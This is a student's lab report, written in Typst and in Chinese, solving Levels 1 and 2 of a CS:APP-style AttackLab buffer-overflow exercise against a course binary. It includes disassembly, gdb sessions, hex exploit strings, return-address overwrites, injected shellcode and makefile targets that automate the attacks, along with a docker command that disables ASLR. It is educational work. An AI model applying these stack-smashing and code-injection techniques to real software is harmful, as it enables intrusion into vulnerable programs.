#import "@preview/scripst:1.1.1": *

#show: scripst.with(
  template: "report",
  title: [计算机组成原理实验报告],
  info: [AttackLAB],
  author: ("Anzreww",),
  time: "2025年11月",
  contents: true,
  content-depth: 3,
  matheq-depth: 3,
  lang: "zh",
)

= 实验目的

= 实验环境

- 操作系统：Linux (Ubuntu 20.04 docker)

  makefile 部分代码如下：
  ```makefile
  docker:
    docker run --rm -it --privileged \
      -v $(PWD):/lab -w /lab \
      $(UBUNTU_IMAGE) /bin/bash -c "\
        echo 0 > /proc/sys/kernel/randomize_va_space && \
        apt update && \
        DEBIAN_FRONTEND=noninteractive apt install -y build-essential gdb && \
        echo '>>> Environment ready! Entering shell...' && \
        bash"
  ```
  经测试，宿主机archlinux同样可以直接运行实验代码，无需docker。
- 编译器：gcc
- 调试器：gdb
- 反汇编工具：objdump

= 实验内容

== Level 1: 简单缓冲区溢出

Level 1 要求我们利用缓冲区溢出漏洞，覆盖返回地址，使程序跳转到 `touch1` 函数，从而通过验证。

先将 `ctarget` 进行反汇编，查看其汇编代码，得到 `getbuf` 函数的栈帧布局和 `touch1` 函数的地址。

makefile 部分代码如下：
```makefile
CTARGET := ./ctarget
DISASC := ctarget.d
OUT=builds

disas_ctarget:
	mkdir -p $(OUT)
	objdump -M intel -d ./ctarget > $(OUT)/ctarget.d
	nm -n ./ctarget > $(OUT)/ctarget.sym
```
由此可以得到 `ctarget` 的反汇编文件 `ctarget.d` 和符号表 `ctarget.sym`。

查看汇编代码找到 `getbuf` 函数以及想要跳转到的 `touch1` 函数：
```asm
00000000008089c0 <getbuf>:
  8089c0:	48 83 ec 18          	sub    rsp,0x18
  8089c4:	48 89 e7             	mov    rdi,rsp
  8089c7:	e8 94 02 00 00       	call   808c60 <Gets>
  8089cc:	b8 01 00 00 00       	mov    eax,0x1
  8089d1:	48 83 c4 18          	add    rsp,0x18
  8089d5:	c3                   	ret

00000000008089d6 <touch1>:
  8089d6:	48 83 ec 08          	sub    rsp,0x8
  8089da:	c7 05 18 3b 20 00 01 	mov    DWORD PTR [rip+0x203b18],0x1        # a0c4fc <vlevel>
  8089e1:	00 00 00
  8089e4:	48 8d 3d 20 19 00 00 	lea    rdi,[rip+0x1920]        # 80a30b <_IO_stdin_used+0x27b>
  8089eb:	e8 d0 82 bf ff       	call   400cc0 <puts@plt>
  8089f0:	bf 01 00 00 00       	mov    edi,0x1
  8089f5:	e8 dd 04 00 00       	call   808ed7 <validate>
  8089fa:	bf 00 00 00 00       	mov    edi,0x0
  8089ff:	e8 1c 84 bf ff       	call   400e20 <exit@plt>
```
- 得到 `touch1` 函数的地址为 `0x08089d6`。
- `getbuf` 函数中调用了 `Gets` 函数从标准输入读取数据到栈上，栈空间大小为 0x18 字节（24 字节）。
- 所以注入时：写入 24 个字节“垃圾”之后，接下来的 8 个字节就正好覆盖返回地址。
- 我们写24个A字符作为填充，然后写入 `touch1` 函数的地址 `0x08089d6` 作为新的返回地址。

构造攻击输入：
```txt
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 d6 89 80 00 00 00 00 00
```
注意这是小端序存储，地址 `0x08089d6` 从低位到高位依次存储为 `d6 89 80 00 00 00 00 00`。之后将其转换为raw格式的文件进行输入即可。

```makefile
level1: $(CTARGET) disas_ctarget
	mkdir -p $(SRC)
	rm -f $(SRC)/ctarget01.txt
	for i in `seq 24`; do \
		echo -n "41 " >> $(SRC)/ctarget01.txt; \
	done
	echo -n $(TOUCH1_ADDR_STR) >> $(SRC)/ctarget01.txt
	$(HEX2RAW) < $(SRC)/ctarget01.txt > $(OUT)/level1-raw
	$(CTARGET) < $(OUT)/level1-raw
```
执行 `make level1` 即可完成 Level 1 的攻击
```txt
Cookie: 0x********
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

== Level 2: 更复杂的缓冲区溢出

Level 2 要求我们同样利用缓冲区溢出漏洞，覆盖返回地址，此外还要函数第 1 个参数 `%rdi` 设置为 `cookie`；然后 `ret` 到 `touch2` 的入口地址。

首先查看 `touch2` 函数的地址：
```asm
0000000000808a04 <touch2>:
  808a04:	48 83 ec 08          	sub    rsp,0x8
  808a08:	89 fa                	mov    edx,edi
  808a0a:	c7 05 e8 3a 20 00 02 	mov    DWORD PTR [rip+0x203ae8],0x2        # a0c4fc <vlevel>
  808a11:	00 00 00
  808a14:	39 3d ea 3a 20 00    	cmp    DWORD PTR [rip+0x203aea],edi        # a0c504 <cookie>
  808a1a:	74 2a                	je     808a46 <touch2+0x42>
  808a1c:	48 8d 35 35 19 00 00 	lea    rsi,[rip+0x1935]        # 80a358 <_IO_stdin_used+0x2c8>
  808a23:	bf 01 00 00 00       	mov    edi,0x1
  808a28:	b8 00 00 00 00       	mov    eax,0x0
  808a2d:	e8 ae 83 bf ff       	call   400de0 <__printf_chk@plt>
  808a32:	bf 02 00 00 00       	mov    edi,0x2
  808a37:	e8 6b 05 00 00       	call   808fa7 <fail>
  808a3c:	bf 00 00 00 00       	mov    edi,0x0
  808a41:	e8 da 83 bf ff       	call   400e20 <exit@plt>
  808a46:	48 8d 35 e3 18 00 00 	lea    rsi,[rip+0x18e3]        # 80a330 <_IO_stdin_used+0x2a0>
  808a4d:	bf 01 00 00 00       	mov    edi,0x1
  808a52:	b8 00 00 00 00       	mov    eax,0x0
  808a57:	e8 84 83 bf ff       	call   400de0 <__printf_chk@plt>
  808a5c:	bf 02 00 00 00       	mov    edi,0x2
  808a61:	e8 71 04 00 00       	call   808ed7 <validate>
  808a66:	eb d4                	jmp    808a3c <touch2+0x38>
```
得到 `touch2` 函数的地址为 `0x0808a04`。

下一步，我们需要找到 `getbuf` 函数的栈帧布局
```log
❯ gdb ./ctarget
GNU gdb (GDB) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
For help, type "help".
Reading symbols from ./ctarget...
(gdb) break getbuf
Breakpoint 1 at 0x8089c0: file buf.c, line 12.
(gdb) run
Cookie: 0x********
Breakpoint 1, getbuf () at buf.c:12
warning: 12     buf.c: 没有那个文件或目录
(gdb) ni
14      in buf.c
(gdb) ni
0x00000000008089c7      14      in buf.c
(gdb) print/x $rsp
$1 = 0x5563e958
```
这里`rsp` 的值为 `0x5563e958`，我们就得到了 `buf` 缓冲区的起始地址。

于是我们注入的内容如下：
```
[ shellcode:
  movl $cookie,%edi;
  pushq $(touch2_addr);
  ret
] + [ padding to fill buf ]
[ new return address: buf_start_addr ]
```
- 在运行到 `getbuf` 函数时，`rsp` 指向 `buf` 缓冲区的起始地址 `0x5563e958`。我们将 shellcode 写入 `buf`，然后覆盖返回地址为 `buf` 的起始地址，这样当 `getbuf` 函数返回时，就会跳转到我们注入的 shellcode 处执行。
- shellcode 的第一条指令将 `cookie` 值加载到 `%edi` 寄存器中，作为 `touch2` 函数的第 1 个参数。
- shellcode 的第二条指令将 `touch2` 函数的地址压入栈中，作为 `ret` 指令的返回地址。
- 最后一条指令 `ret` 会弹出栈顶的地址并跳转到 `touch2` 函数。

我们得到了最后的攻击输入：
```txt
[ shellcode in hex ] + [ padding ] + [ rsp address in little-endian ]
```
生成攻击输入的 makefile 代码如下：
```makefile
$(OUT)/level2_payload.s: cookie.txt
	mkdir -p $(OUT)
	echo "    .text" > $@
	echo "    .globl _start" >> $@
	echo "_start:" >> $@
	echo "    movl $$ $(COOKIE), %edi" >> $@
	echo "    pushq $$ $(TOUCH2_ADDR)" >> $@
	echo "    ret" >> $@

$(OUT)/level2_payload.d: $(OUT)/level2_payload.s
	gcc -c $< -o $(OUT)/level2_payload.o
	objdump -M intel -d $(OUT)/level2_payload.o > $@

$(OUT)/level2_payload.hex: $(OUT)/level2_payload.d
	grep "^ " $< | awk '/^[[:space:]]*[0-9a-f]+:/ { \
		for (i=2; i<=NF; i++) { \
			if ($$i ~ /^[0-9a-f][0-9a-f]$$/) printf "%s ", $$i; \
			else break; \
		} \
	} END { printf "\n"; }' > $@

level2: $(OUT)/level2_payload.hex disas_ctarget
	mkdir -p $(SRC)
	tr -d '\n' < $(OUT)/level2_payload.hex > $(SRC)/ctarget02.txt
	for i in `seq 13`; do \
		echo "41 " >> $(SRC)/ctarget02.txt; \
	done
	echo -n "$(BUF_ADDR_STR) " >> $(SRC)/ctarget02.txt
	./hex2raw < $(SRC)/ctarget02.txt > $(OUT)/level2-raw.txt
	./ctarget < $(OUT)/level2-raw.txt
```
其中编写了汇编代码
```asm
    .text
    .globl _start
_start:
    movl $<cookie>, %edi
    pushq $<touch2_addr>
    ret
```
执行 `make level2` 即可完成 Level 2 的攻击
```txt
Cookie: 0x********
Type string:Touch2!: You called touch2(0x177c81f7)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

== Level 3: 防护机制绕过
